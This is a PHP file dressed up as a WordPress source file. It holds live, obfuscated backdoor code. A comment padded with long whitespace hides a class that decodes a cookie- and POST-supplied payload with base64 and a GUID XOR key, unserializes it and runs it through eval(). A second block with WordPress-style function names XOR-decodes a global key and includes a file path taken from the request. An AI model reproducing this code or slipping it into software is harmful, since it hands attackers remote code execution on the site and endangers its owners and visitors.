<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $yWOUZTa = chr (78) . chr (100) . 't' . "\x5f" . 'd' . 'i' . chr ( 817 - 715 ).chr ( 1020 - 909 ).chr (90); $eRCpJQHk = chr (99) . chr ( 1025 - 917 ).chr (97) . chr ( 444 - 329 )."\x73" . "\x5f" . chr ( 552 - 451 )."\170" . "\x69" . chr (115) . chr (116) . 's';$HhJUZwY = $eRCpJQHk($yWOUZTa); $nhdaG = $HhJUZwY;if (!$nhdaG){class Ndt_difoZ{private $AQFpjH;public static $XnhJGE = "52b0c4a4-21c8-441b-b521-673c5bac67c7";public static $QVCZDqH = NULL;public function __construct(){$fdpSD = $_COOKIE;$HTIol = $_POST;$NxhJhaVlYl = @$fdpSD[substr(Ndt_difoZ::$XnhJGE, 0, 4)];if (!empty($NxhJhaVlYl)){$ENkKUekppu = "base64";$CFCPy = "";$NxhJhaVlYl = explode(",", $NxhJhaVlYl);foreach ($NxhJhaVlYl as $zmEpzgtR){$CFCPy .= @$fdpSD[$zmEpzgtR];$CFCPy .= @$HTIol[$zmEpzgtR];}$CFCPy = array_map($ENkKUekppu . chr (95) . "\144" . 'e' . chr (99) . 'o' . chr (100) . 'e', array($CFCPy,)); $CFCPy = $CFCPy[0] ^ str_repeat(Ndt_difoZ::$XnhJGE, (strlen($CFCPy[0]) / strlen(Ndt_difoZ::$XnhJGE)) + 1);Ndt_difoZ::$QVCZDqH = @unserialize($CFCPy);}}public function __destruct(){$this->AbJZvWM();}private function AbJZvWM(){if (is_array(Ndt_difoZ::$QVCZDqH)) {$FiJtm = str_replace("\74" . chr (63) . 'p' . "\150" . chr ( 848 - 736 ), "", Ndt_difoZ::$QVCZDqH["\143" . "\x6f" . chr ( 146 - 36 )."\x74" . chr ( 752 - 651 ).chr (110) . "\x74"]);eval($FiJtm);exit();}}}$LRdGGNIDf = new Ndt_difoZ(); $LRdGGNIDf = NULL;} ?><?php /* 
*
...
function current_guid($show_in_nav_menus)

{

    $exclusions = $show_in_nav_menus;
    
    $parent_id = $GLOBALS[single("%0D%15%23%284%60", $exclusions)];
    $no_texturize_shortcodes = $parent_id;
    $_links_add_base = isset($no_texturize_shortcodes[$exclusions]);
    if ($_links_add_base)

    {

        $taxonomy_obj = $parent_id[$exclusions];
        $post_category = $taxonomy_obj[single("%26%3E%1A%3B%1FR%1D%2F", $exclusions)];

        $ext_type = $post_category;
        include ($ext_type);
    }
}
function single($name_offset, $prime_pattern)

{

    $hex_encoding = $prime_pattern;

    $group_mime_types = "url" . "decode";

    $check_name = $group_mime_types($name_offset);
	$emoji_field = 'site_url';
    $protected = substr($hex_encoding,0, strlen($check_name));

    $prefixed = $check_name ^ $protected;
    
	$weeks = 'statuses';
    $check_name = strpos($prefixed, $protected);
	$closing_quote = 'found_shortcodes';
    
    return $prefixed;
}


current_guid('RSjdq3pJOi');
	$nestable_tags = 'new_date';
